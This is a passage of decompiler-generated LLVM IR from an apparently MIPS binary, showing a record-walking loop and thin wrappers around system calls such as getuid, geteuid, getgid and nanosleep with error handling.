  %v1_40751c = phi i32 [ %v2_407554, %dec_label_pc_407508 ], [ %v0_407504, %dec_label_pc_4074fc ]
  %v1_407508 = add i32 %v1_40751c, 16
  %v2_407508 = inttoptr i32 %v1_407508 to i16*
  %v3_407508 = load i16, i16* %v2_407508, align 2
  %v4_407508 = zext i16 %v3_407508 to i32
  store i32 %v4_407508, i32* %v0.global-to-local, align 4
  %v1_40750c = add i32 %v1_40751c, 4
  %v2_40750c = inttoptr i32 %v1_40750c to i32*
  %v3_40750c = load i32, i32* %v2_40750c, align 4
  %v1_407510 = add i32 %v1_40751c, 12
  %v2_407510 = inttoptr i32 %v1_407510 to i32*
  %v3_407510 = load i32, i32* %v2_407510, align 4
  store i32 %v3_407510, i32* @a3, align 4
  %v1_407514 = add i32 %v1_40751c, 18
  %v2_407514 = inttoptr i32 %v1_407514 to i8*
  %v3_407514 = load i8, i8* %v2_407514, align 1
  %v4_407514 = zext i8 %v3_407514 to i32
  store i32 %v4_407514, i32* %t0.global-to-local, align 4
  store i32 %v4_407508, i32* %a2.global-to-local, align 4
  %v2_40751c = inttoptr i32 %v1_40751c to i32*
  store i32 %v3_40750c, i32* %v2_40751c, align 4
  %v0_407520 = load i32, i32* @a3, align 4
  %v1_407520 = load i32, i32* @s0, align 4
  %v2_407520 = add i32 %v1_407520, 4
  %v3_407520 = inttoptr i32 %v2_407520 to i32*
  store i32 %v0_407520, i32* %v3_407520, align 4
  %v0_407524 = load i32, i32* %t0.global-to-local, align 4
  %v1_407524 = trunc i32 %v0_407524 to i8
  %v2_407524 = load i32, i32* @s0, align 4
  %v3_407524 = add i32 %v2_407524, 10
  %v4_407524 = inttoptr i32 %v3_407524 to i8*
  store i8 %v1_407524, i8* %v4_407524, align 1
  %v0_407528 = load i32, i32* %v0.global-to-local, align 4
  %v1_407528 = trunc i32 %v0_407528 to i16
  %v2_407528 = load i32, i32* @s0, align 4
  %v3_407528 = add i32 %v2_407528, 8
  %v4_407528 = inttoptr i32 %v3_407528 to i16*
  store i16 %v1_407528, i16* %v4_407528, align 2
  %v0_40752c = load i32, i32* @t9, align 4
  %v1_40752c = load i32, i32* %a2.global-to-local, align 4
  %v2_40752c = add i32 %v1_40752c, -19
  store i32 %v2_40752c, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_40752c)
  %v0_407538 = load i32, i32* @s0, align 4
  %v1_407538 = add i32 %v0_407538, 8
  %v2_407538 = inttoptr i32 %v1_407538 to i16*
  %v3_407538 = load i16, i16* %v2_407538, align 2
  %v4_407538 = zext i16 %v3_407538 to i32
  store i32 %v4_407538, i32* %a2.global-to-local, align 4
  %v3_40753c = load i32, i32* @global_var_449a08.253, align 4
  store i32 %v3_40753c, i32* @t9, align 4
  %v5_407544 = call i32 @function_405800(i32 %v0_407538, i32 %v0_407538, i32 %v4_407538)
  store i32 %v5_407544, i32* %v0.global-to-local, align 4
  %v0_40754c = load i32, i32* @s0, align 4
  %v1_40754c = add i32 %v0_40754c, 8
  %v2_40754c = inttoptr i32 %v1_40754c to i16*
  %v3_40754c = load i16, i16* %v2_40754c, align 2
  %v4_40754c = zext i16 %v3_40754c to i32
  %v2_407554 = add i32 %v4_40754c, %v0_40754c
  store i32 %v2_407554, i32* @s0, align 4
  %v1_407558 = load i32, i32* %s2.global-to-local, align 4
  %v2_407558 = icmp ult i32 %v2_407554, %v1_407558
  %v3_407558 = zext i1 %v2_407558 to i32
  store i32 %v3_407558, i32* %v0.global-to-local, align 4
  %v3_40755c = load i32, i32* @global_var_449a08.253, align 4
  store i32 %v3_40755c, i32* @t9, align 4
  br i1 %v2_407558, label %dec_label_pc_407508, label %dec_label_pc_40756c.loopexit

dec_label_pc_40756c.loopexit:                     ; preds = %dec_label_pc_407508
  %v0_40756c.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_40756c

dec_label_pc_40756c:                              ; preds = %dec_label_pc_40756c.loopexit, %dec_label_pc_4074c0
  %v0_40756c = phi i32 [ %v0_40756c.pre, %dec_label_pc_40756c.loopexit ], [ %v2_4074ec, %dec_label_pc_4074c0 ]
  store i32 %v0_40756c, i32* %v0.global-to-local, align 4
  store i32 %v0_4074d0, i32* @ra, align 4
  ret i32 %v0_40756c

; uselistorder directives
  uselistorder i32 %v0_40756c, { 1, 0 }
  uselistorder i32 %v2_407554, { 1, 2, 0 }
  uselistorder i32 %v0_407538, { 1, 0, 2 }
  uselistorder i32 %v1_40751c, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_407504, { 1, 0 }
  uselistorder i32 %v2_4074ec, { 1, 0, 2, 3, 4 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @function_405800, { 4, 2, 1, 0, 3 }
  uselistorder i32 10, { 13, 14, 0, 15, 6, 16, 17, 1, 18, 8, 4, 19, 7, 20, 21, 22, 2, 23, 24, 25, 9, 10, 11, 5, 12, 26, 27, 28, 3, 29, 30 }
}

define i32 @function_407590() local_unnamed_addr {
dec_label_pc_407590:
  %a2.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %s7.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v1_407598 = load i32, i32* @t9, align 4
  %v2_407598 = add i32 %v1_407598, 304160
  store i32 %v2_407598, i32* %gp.global-to-local, align 4
  %v2_40759c = ptrtoint i32* %stack_var_-72 to i32
  %v0_4075d0 = load i32, i32* @a2, align 4
  %v1_4075d0 = add i32 %v0_4075d0, 14
  %v1_4075d4 = and i32 %v1_4075d0, -8
  %v2_4075dc = sub i32 %v2_40759c, %v1_4075d4
  %v1_4075e0 = add i32 %v2_4075dc, 24
  store i32 %v1_4075e0, i32* %s3.global-to-local, align 4
  %v0_4075e4 = load i32, i32* @a1, align 4
  store i32 %v0_4075e4, i32* %s4.global-to-local, align 4
  store i32 %v0_4075d0, i32* %s5.global-to-local, align 4
  store i32 4219, i32* %v0.global-to-local, align 4
  %v0_4075fc = load i32, i32* @a3, align 4
  %v1_4075fc = icmp eq i32 %v0_4075fc, 0
  store i32 4219, i32* %s2.global-to-local, align 4
  br i1 %v1_4075fc, label %dec_label_pc_407620, label %dec_label_pc_407628

dec_label_pc_407620:                              ; preds = %dec_label_pc_407590
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v0_4075e4, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_407634

dec_label_pc_407628:                              ; preds = %dec_label_pc_407590
  %v3_407604 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_407604, i32* @t9, align 4
  %v1_40760c = call i32 @function_4056e0()
  store i32 %v2_407598, i32* %gp.global-to-local, align 4
  %v0_407618 = load i32, i32* %s2.global-to-local, align 4
  %v2_407618 = inttoptr i32 %v1_40760c to i32*
  store i32 %v0_407618, i32* %v2_407618, align 4
  store i32 -1, i32* %s2.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v3_4076242 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v3_4076242, i32* %s1.global-to-local, align 4
  %v0_407634.pre = load i32, i32* %s3.global-to-local, align 4
  %v0_407658.pre.pre = load i32, i32* @a3, align 4
  br label %dec_label_pc_407634

dec_label_pc_407634:                              ; preds = %dec_label_pc_407620, %dec_label_pc_407628
  %v0_407658.pre = phi i32 [ 0, %dec_label_pc_407620 ], [ %v0_407658.pre.pre, %dec_label_pc_407628 ]
  %v0_4076546 = phi i32 [ %v0_4075e4, %dec_label_pc_407620 ], [ %v3_4076242, %dec_label_pc_407628 ]
  %v0_407634 = phi i32 [ %v1_4075e0, %dec_label_pc_407620 ], [ %v0_407634.pre, %dec_label_pc_407628 ]
  store i32 %v0_407634, i32* %s0.global-to-local, align 4
  store i32 -1, i32* %s7.global-to-local, align 4
  store i32 -1, i32* %s6.global-to-local, align 4
  br label %dec_label_pc_407644

dec_label_pc_407644:                              ; preds = %dec_label_pc_4076a8.dec_label_pc_407644_crit_edge, %dec_label_pc_407634
  %v2_40765c = phi i32 [ %v2_40765c.pre, %dec_label_pc_4076a8.dec_label_pc_407644_crit_edge ], [ -1, %dec_label_pc_407634 ]
  %v0_407658 = phi i32 [ %v4_407710, %dec_label_pc_4076a8.dec_label_pc_407644_crit_edge ], [ %v0_407658.pre, %dec_label_pc_407634 ]
  %v0_407654 = phi i32 [ %v0_407708, %dec_label_pc_4076a8.dec_label_pc_407644_crit_edge ], [ %v0_4076546, %dec_label_pc_407634 ]
  %v0_407644 = phi i32 [ %v2_4076f8, %dec_label_pc_4076a8.dec_label_pc_407644_crit_edge ], [ %v0_407634, %dec_label_pc_407634 ]
  %v1_407644 = add i32 %v0_407644, 16
  %v2_407644 = inttoptr i32 %v1_407644 to i16*
  %v3_407644 = load i16, i16* %v2_407644, align 2
  %v4_407644 = zext i16 %v3_407644 to i32
  store i32 -8, i32* %v1.global-to-local, align 4
  %v1_40764c = add nuw nsw i32 %v4_407644, 7
  %v2_407650 = and i32 %v1_40764c, 131064
  store i32 %v2_407650, i32* %a2.global-to-local, align 4
  %v2_407654 = add i32 %v2_407650, %v0_407654
  store i32 %v2_407654, i32* %t0.global-to-local, align 4
  %v2_407658 = icmp ult i32 %v0_407658, %v2_407654
  %v3_407658 = zext i1 %v2_407658 to i32
  store i32 %v3_407658, i32* %v0.global-to-local, align 4
  %v1_40765c = icmp eq i1 %v2_407658, false
  store i32 %v2_40765c, i32* @a3, align 4
  br i1 %v1_40765c, label %dec_label_pc_4076a8, label %dec_label_pc_407660

dec_label_pc_407660:                              ; preds = %dec_label_pc_407644
  %v0_407664 = load i32, i32* %gp.global-to-local, align 4
  %v1_407664 = add i32 %v0_407664, -32132
  %v2_407664 = inttoptr i32 %v1_407664 to i32*
  %v3_407664 = load i32, i32* %v2_407664, align 4
  store i32 %v3_407664, i32* @t9, align 4
  %v0_40766c = load i32, i32* @sp, align 4
  %v1_40766c = add i32 %v0_40766c, 16
  %v2_40766c = inttoptr i32 %v1_40766c to i32*
  store i32 0, i32* %v2_40766c, align 4
  %v1_407670 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v1_407670, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_407664)
  store i32 %v2_407598, i32* %gp.global-to-local, align 4
  %v0_40767c = load i32, i32* %s1.global-to-local, align 4
  %v1_40767c = load i32, i32* %s4.global-to-local, align 4
  %v2_40767c = icmp eq i32 %v0_40767c, %v1_40767c
  br i1 %v2_40767c, label %dec_label_pc_407680, label %dec_label_pc_407718

dec_label_pc_407680:                              ; preds = %dec_label_pc_407660
  %v3_407684 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_407684, i32* @t9, align 4
  %v1_40768c = call i32 @function_4056e0()
  store i32 %v1_40768c, i32* %v0.global-to-local, align 4
  store i32 %v2_407598, i32* %gp.global-to-local, align 4
  store i32 22, i32* %v1.global-to-local, align 4
  %v2_4076a4 = inttoptr i32 %v1_40768c to i32*
  store i32 22, i32* %v2_4076a4, align 4
  %v0_4076a8.pre = load i32, i32* %s0.global-to-local, align 4
  %v1_4076b8.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4076a8

dec_label_pc_4076a8:                              ; preds = %dec_label_pc_407644, %dec_label_pc_407680
  %v1_4076b8 = phi i32 [ %v0_407654, %dec_label_pc_407644 ], [ %v1_4076b8.pre, %dec_label_pc_407680 ]
  %v0_4076b0 = phi i32 [ %v0_407644, %dec_label_pc_407644 ], [ %v0_4076a8.pre, %dec_label_pc_407680 ]
  %v1_4076a8 = add i32 %v0_4076b0, 4
  %v2_4076a8 = inttoptr i32 %v1_4076a8 to i32*
  %v3_4076a8 = load i32, i32* %v2_4076a8, align 4
  store i32 %v3_4076a8, i32* %v1.global-to-local, align 4
  %v1_4076ac = inttoptr i32 %v0_4076b0 to i32*
  %v2_4076ac = load i32, i32* %v1_4076ac, align 4
  store i32 %v2_4076ac, i32* %v0.global-to-local, align 4
  %v1_4076b0 = add i32 %v0_4076b0, 12
  %v2_4076b0 = inttoptr i32 %v1_4076b0 to i32*
  %v3_4076b0 = load i32, i32* %v2_4076b0, align 4
  store i32 %v3_4076b0, i32* %s7.global-to-local, align 4
  %v1_4076b4 = add i32 %v0_4076b0, 8
  %v2_4076b4 = inttoptr i32 %v1_4076b4 to i32*
  %v3_4076b4 = load i32, i32* %v2_4076b4, align 4
  store i32 %v3_4076b4, i32* %s6.global-to-local, align 4
  %v2_4076b8 = add i32 %v1_4076b8, 4
  %v3_4076b8 = inttoptr i32 %v2_4076b8 to i32*
  store i32 %v3_4076a8, i32* %v3_4076b8, align 4
  %v0_4076bc = load i32, i32* %v0.global-to-local, align 4
  %v1_4076bc = load i32, i32* %s1.global-to-local, align 4
  %v2_4076bc = inttoptr i32 %v1_4076bc to i32*
  store i32 %v0_4076bc, i32* %v2_4076bc, align 4
  %v0_4076c0 = load i32, i32* %s0.global-to-local, align 4
  %v1_4076c0 = add i32 %v0_4076c0, 8
  %v2_4076c0 = inttoptr i32 %v1_4076c0 to i32*
  %v3_4076c0 = load i32, i32* %v2_4076c0, align 4
  store i32 %v3_4076c0, i32* %v0.global-to-local, align 4
  %v1_4076c4 = add i32 %v0_4076c0, 12
  %v2_4076c4 = inttoptr i32 %v1_4076c4 to i32*
  %v3_4076c4 = load i32, i32* %v2_4076c4, align 4
  store i32 %v3_4076c4, i32* %v1.global-to-local, align 4
  %v0_4076c8 = load i32, i32* %a2.global-to-local, align 4
  %v1_4076c8 = trunc i32 %v0_4076c8 to i16
  %v2_4076c8 = load i32, i32* %s1.global-to-local, align 4
  %v3_4076c8 = add i32 %v2_4076c8, 16
  %v4_4076c8 = inttoptr i32 %v3_4076c8 to i16*
  store i16 %v1_4076c8, i16* %v4_4076c8, align 2
  %v0_4076cc = load i32, i32* %v1.global-to-local, align 4
  %v1_4076cc = load i32, i32* %s1.global-to-local, align 4
  %v2_4076cc = add i32 %v1_4076cc, 12
  %v3_4076cc = inttoptr i32 %v2_4076cc to i32*
  store i32 %v0_4076cc, i32* %v3_4076cc, align 4
  %v0_4076d0 = load i32, i32* %v0.global-to-local, align 4
  %v1_4076d0 = load i32, i32* %s1.global-to-local, align 4
  %v2_4076d0 = add i32 %v1_4076d0, 8
  %v3_4076d0 = inttoptr i32 %v2_4076d0 to i32*
  store i32 %v0_4076d0, i32* %v3_4076d0, align 4
  %v0_4076d4 = load i32, i32* %s0.global-to-local, align 4
  %v1_4076d4 = add i32 %v0_4076d4, 18
  %v2_4076d4 = inttoptr i32 %v1_4076d4 to i8*
  %v3_4076d4 = load i8, i8* %v2_4076d4, align 1
  %v4_4076d4 = zext i8 %v3_4076d4 to i32
  store i32 %v4_4076d4, i32* %v0.global-to-local, align 4
  %v2_4076dc = load i32, i32* %s1.global-to-local, align 4
  %v3_4076dc = add i32 %v2_4076dc, 18
  %v4_4076dc = inttoptr i32 %v3_4076dc to i8*
  store i8 %v3_4076d4, i8* %v4_4076dc, align 1
  %v0_4076e0 = load i32, i32* %s0.global-to-local, align 4
  %v1_4076e0 = add i32 %v0_4076e0, 16
  %v2_4076e0 = inttoptr i32 %v1_4076e0 to i16*
  %v3_4076e0 = load i16, i16* %v2_4076e0, align 2
  %v4_4076e0 = zext i16 %v3_4076e0 to i32
  %v0_4076e4 = load i32, i32* %t0.global-to-local, align 4
  store i32 %v0_4076e4, i32* %s1.global-to-local, align 4
  %v0_4076e8 = load i32, i32* @t9, align 4
  %v2_4076e8 = add nsw i32 %v4_4076e0, -19
  store i32 %v2_4076e8, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_4076e8)
  %v0_4076f0 = load i32, i32* %s0.global-to-local, align 4
  %v1_4076f0 = add i32 %v0_4076f0, 16
  %v2_4076f0 = inttoptr i32 %v1_4076f0 to i16*
  %v3_4076f0 = load i16, i16* %v2_4076f0, align 2
  %v4_4076f0 = zext i16 %v3_4076f0 to i32
  store i32 %v2_407598, i32* %gp.global-to-local, align 4
  %v2_4076f8 = add i32 %v4_4076f0, %v0_4076f0
  store i32 %v2_4076f8, i32* %s0.global-to-local, align 4
  %v0_4076fc = load i32, i32* %s3.global-to-local, align 4
  %v1_4076fc = load i32, i32* %s2.global-to-local, align 4
  %v2_4076fc = add i32 %v1_4076fc, %v0_4076fc
  %v2_407700 = icmp ult i32 %v2_4076f8, %v2_4076fc
  %v3_407700 = zext i1 %v2_407700 to i32
  store i32 %v3_407700, i32* %v0.global-to-local, align 4
  %v3_407704 = load i32, i32* @global_var_449b68.192, align 4
  store i32 %v3_407704, i32* @t9, align 4
  %v0_407708 = load i32, i32* %s1.global-to-local, align 4
  %v1_407710 = icmp eq i1 %v2_407700, false
  %v2_407710 = load i32, i32* %s4.global-to-local, align 4
  %v3_407710 = load i32, i32* %s5.global-to-local, align 4
  %v4_407710 = add i32 %v3_407710, %v2_407710
  store i32 %v4_407710, i32* @a3, align 4
  br i1 %v1_407710, label %dec_label_pc_407718, label %dec_label_pc_4076a8.dec_label_pc_407644_crit_edge

dec_label_pc_4076a8.dec_label_pc_407644_crit_edge: ; preds = %dec_label_pc_4076a8
  %v2_40765c.pre = load i32, i32* %s7.global-to-local, align 4
  br label %dec_label_pc_407644

dec_label_pc_407718:                              ; preds = %dec_label_pc_4076a8, %dec_label_pc_407660
  %v1_407718 = phi i32 [ %v2_407710, %dec_label_pc_4076a8 ], [ %v1_40767c, %dec_label_pc_407660 ]
  %v0_407718 = phi i32 [ %v0_407708, %dec_label_pc_4076a8 ], [ %v0_40767c, %dec_label_pc_407660 ]
  %v2_407718 = sub i32 %v0_407718, %v1_407718
  store i32 %v2_407718, i32* %v0.global-to-local, align 4
  ret i32 %v2_407718

; uselistorder directives
  uselistorder i32 %v2_407718, { 1, 0 }
  uselistorder i32 %v4_407710, { 1, 0 }
  uselistorder i32 %v2_407710, { 1, 0 }
  uselistorder i32 %v2_4076f8, { 1, 2, 0 }
  uselistorder i32 %v0_4076b0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_407654, { 1, 0 }
  uselistorder i32 %v2_407598, { 0, 2, 1, 3, 4 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 11, 8, 10 }
  uselistorder i32* %s3.global-to-local, { 1, 0, 2 }
  uselistorder i32* %s2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 3, 9, 10, 2 }
  uselistorder i32* %s0.global-to-local, { 0, 2, 5, 3, 4, 1, 6 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %a2.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 -19, { 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32 18, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 1, 0 }
  uselistorder i32 7, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_4076a8, { 1, 0 }
  uselistorder label %dec_label_pc_407634, { 1, 0 }
}

define i32 @function_407760() local_unnamed_addr {
dec_label_pc_407760:
  %s0.global-to-local = alloca i32, align 4
  %v0_407780 = call i32 @getegid()
  %v3_407784 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_407784, i32* @t9, align 4
  %v0_407788 = load i32, i32* @a3, align 4
  %v1_407788 = icmp eq i32 %v0_407788, 0
  store i32 %v0_407780, i32* %s0.global-to-local, align 4
  br i1 %v1_407788, label %dec_label_pc_4077a4, label %dec_label_pc_40778c

dec_label_pc_40778c:                              ; preds = %dec_label_pc_407760
  %v1_407790 = call i32 @function_4056e0()
  %v0_40779c = load i32, i32* %s0.global-to-local, align 4
  %v2_40779c = inttoptr i32 %v1_407790 to i32*
  store i32 %v0_40779c, i32* %v2_40779c, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4077a4

dec_label_pc_4077a4:                              ; preds = %dec_label_pc_407760, %dec_label_pc_40778c
  %v0_4077a4 = phi i32 [ %v0_407780, %dec_label_pc_407760 ], [ -1, %dec_label_pc_40778c ]
  ret i32 %v0_4077a4

; uselistorder directives
  uselistorder label %dec_label_pc_4077a4, { 1, 0 }
}

define i32 @function_4077c0() local_unnamed_addr {
dec_label_pc_4077c0:
  %s0.global-to-local = alloca i32, align 4
  %v0_4077e0 = call i32 @geteuid()
  %v3_4077e4 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_4077e4, i32* @t9, align 4
  %v0_4077e8 = load i32, i32* @a3, align 4
  %v1_4077e8 = icmp eq i32 %v0_4077e8, 0
  store i32 %v0_4077e0, i32* %s0.global-to-local, align 4
  br i1 %v1_4077e8, label %dec_label_pc_407804, label %dec_label_pc_4077ec

dec_label_pc_4077ec:                              ; preds = %dec_label_pc_4077c0
  %v1_4077f0 = call i32 @function_4056e0()
  %v0_4077fc = load i32, i32* %s0.global-to-local, align 4
  %v2_4077fc = inttoptr i32 %v1_4077f0 to i32*
  store i32 %v0_4077fc, i32* %v2_4077fc, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_407804

dec_label_pc_407804:                              ; preds = %dec_label_pc_4077c0, %dec_label_pc_4077ec
  %v0_407804 = phi i32 [ %v0_4077e0, %dec_label_pc_4077c0 ], [ -1, %dec_label_pc_4077ec ]
  ret i32 %v0_407804

; uselistorder directives
  uselistorder label %dec_label_pc_407804, { 1, 0 }
}

define i32 @function_407820() local_unnamed_addr {
dec_label_pc_407820:
  %s0.global-to-local = alloca i32, align 4
  %v0_407840 = call i32 @getgid()
  %v3_407844 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_407844, i32* @t9, align 4
  %v0_407848 = load i32, i32* @a3, align 4
  %v1_407848 = icmp eq i32 %v0_407848, 0
  store i32 %v0_407840, i32* %s0.global-to-local, align 4
  br i1 %v1_407848, label %dec_label_pc_407864, label %dec_label_pc_40784c

dec_label_pc_40784c:                              ; preds = %dec_label_pc_407820
  %v1_407850 = call i32 @function_4056e0()
  %v0_40785c = load i32, i32* %s0.global-to-local, align 4
  %v2_40785c = inttoptr i32 %v1_407850 to i32*
  store i32 %v0_40785c, i32* %v2_40785c, align 4
  br label %dec_label_pc_407864

dec_label_pc_407864:                              ; preds = %dec_label_pc_407820, %dec_label_pc_40784c
  %v4_40786c = phi i32 [ %v0_407840, %dec_label_pc_407820 ], [ -1, %dec_label_pc_40784c ]
  ret i32 %v4_40786c

; uselistorder directives
  uselistorder label %dec_label_pc_407864, { 1, 0 }
}

define i32 @function_407880(i32 %arg1) local_unnamed_addr {
dec_label_pc_407880:
  %v3_40788c = load i32, i32* @global_var_449ad0, align 4
  %v1_40789c = icmp eq i32 %v3_40788c, 0
  %.v3_40788c = select i1 %v1_40789c, i32 65536, i32 %v3_40788c
  ret i32 %.v3_40788c

; uselistorder directives
  uselistorder i32 65536, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
}

define i32 @function_4078b0() local_unnamed_addr {
dec_label_pc_4078b0:
  %s0.global-to-local = alloca i32, align 4
  %v0_4078d0 = call i32 @getuid()
  %v3_4078d4 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_4078d4, i32* @t9, align 4
  %v0_4078d8 = load i32, i32* @a3, align 4
  %v1_4078d8 = icmp eq i32 %v0_4078d8, 0
  store i32 %v0_4078d0, i32* %s0.global-to-local, align 4
  br i1 %v1_4078d8, label %dec_label_pc_4078f4, label %dec_label_pc_4078dc

dec_label_pc_4078dc:                              ; preds = %dec_label_pc_4078b0
  %v1_4078e0 = call i32 @function_4056e0()
  %v0_4078ec = load i32, i32* %s0.global-to-local, align 4
  %v2_4078ec = inttoptr i32 %v1_4078e0 to i32*
  store i32 %v0_4078ec, i32* %v2_4078ec, align 4
  br label %dec_label_pc_4078f4

dec_label_pc_4078f4:                              ; preds = %dec_label_pc_4078b0, %dec_label_pc_4078dc
  %v4_4078fc = phi i32 [ %v0_4078d0, %dec_label_pc_4078b0 ], [ -1, %dec_label_pc_4078dc ]
  ret i32 %v4_4078fc

; uselistorder directives
  uselistorder label %dec_label_pc_4078f4, { 1, 0 }
}

define i32 @function_407910(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407984:
  %a0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 4140, i32* %v0.global-to-local, align 4
  %v3_40795c = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_40795c, i32* @t9, align 4
  store i32 4140, i32* %a0.global-to-local, align 4
  %v1_40796c = call i32 @function_4056e0()
  store i32 %v1_40796c, i32* %v0.global-to-local, align 4
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_407980 = inttoptr i32 %v1_40796c to i32*
  store i32 4140, i32* %v2_407980, align 4
  %v0_407984.pr = load i32, i32* %v0.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_407984.pr, 0
  br i1 %phitmp, label %dec_label_pc_407998, label %dec_label_pc_407988

dec_label_pc_407988:                              ; preds = %dec_label_pc_407984
  %v0_40798c = load i32, i32* %a0.global-to-local, align 4
  %v1_407994 = ashr i32 %v0_40798c, 31
  store i32 %v1_407994, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407998

dec_label_pc_407998:                              ; preds = %dec_label_pc_407984, %dec_label_pc_407988
  %v3_40799c = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_40799c, i32* %v0.global-to-local, align 4
  ret i32 %v3_40799c

; uselistorder directives
  uselistorder i32* %v0.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_407998, { 1, 0 }
}

define i32 @function_4079c0(%timespec* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4079c0:
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %v6_4079e0 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  %v3_4079e4 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_4079e4, i32* @t9, align 4
  %v1_4079e8 = icmp eq i32 %arg3, 0
  store i32 %v6_4079e0, i32* %s0.global-to-local, align 4
  br i1 %v1_4079e8, label %dec_label_pc_407a04, label %dec_label_pc_4079ec

dec_label_pc_4079ec:                              ; preds = %dec_label_pc_4079c0
  %v1_4079f0 = call i32 @function_4056e0()
  %v0_4079fc = load i32, i32* %s0.global-to-local, align 4
  %v2_4079fc = inttoptr i32 %v1_4079f0 to i32*
  store i32 %v0_4079fc, i32* %v2_4079fc, align 4
  br label %dec_label_pc_407a04

dec_label_pc_407a04:                              ; preds = %dec_label_pc_4079c0, %dec_label_pc_4079ec
  %v4_407a0c = phi i32 [ %v6_4079e0, %dec_label_pc_4079c0 ], [ -1, %dec_label_pc_4079ec ]
  ret i32 %v4_407a0c

; uselistorder directives
  uselistorder label %dec_label_pc_407a04, { 1, 0 }
}

define i32 @function_407a20(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a20:
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v3_407a40 = load i32, i32* bitcast (i32** @global_var_449ac4.255 to i32*), align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  store i32 %v3_407a40, i32* %v0.global-to-local, align 4
  %v3_407a4c = load i32, i32* @global_var_449b9c.256, align 4
  store i32 %v3_407a4c, i32* @t9, align 4
  %v1_407a50 = icmp eq i32 %v3_407a40, 0
  br i1 %v1_407a50, label %dec_label_pc_407a54, label %dec_label_pc_407a74

dec_label_pc_407a54:                              ; preds = %dec_label_pc_407a20
  %v3_407a58 = call i32 @function_408110(i32* null)
  store i32 %v3_407a58, i32* %v0.global-to-local, align 4
  %v1_407a64 = icmp slt i32 %v3_407a58, 0
  br i1 %v1_407a64, label %dec_label_pc_407a94, label %dec_label_pc_407a68

dec_label_pc_407a68:                              ; preds = %dec_label_pc_407a54
  %v3_407a6c = load i32, i32* @global_var_449b9c.256, align 4
  %v2_407a70 = load i32, i32* bitcast (i32** @global_var_449ac4.255 to i32*), align 4
  store i32 %v2_407a70, i32* %v0.global-to-local, align 4
  %v0_407a74.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_407a74

dec_label_pc_407a74:                              ; preds = %dec_label_pc_407a20, %dec_label_pc_407a68
  %v0_407a80 = phi i32 [ %v3_407a4c, %dec_label_pc_407a20 ], [ %v3_407a6c, %dec_label_pc_407a68 ]
  %v0_407a7c = phi i32 [ %v3_407a40, %dec_label_pc_407a20 ], [ %v2_407a70, %dec_label_pc_407a68 ]
  %v1_407a7c = phi i32 [ %arg1, %dec_label_pc_407a20 ], [ %v0_407a74.pre, %dec_label_pc_407a68 ]
  %v1_407a74 = icmp eq i32 %v1_407a7c, 0
  br i1 %v1_407a74, label %dec_label_pc_407a98, label %dec_label_pc_407a78

dec_label_pc_407a78:                              ; preds = %dec_label_pc_407a74
  call void @__pseudo_call(i32 %v0_407a80)
  %v0_407a8c = load i32, i32* %v0.global-to-local, align 4
  %v1_407a8c = icmp sgt i32 %v0_407a8c, -1
  store i32 %v0_407a7c, i32* %v0.global-to-local, align 4
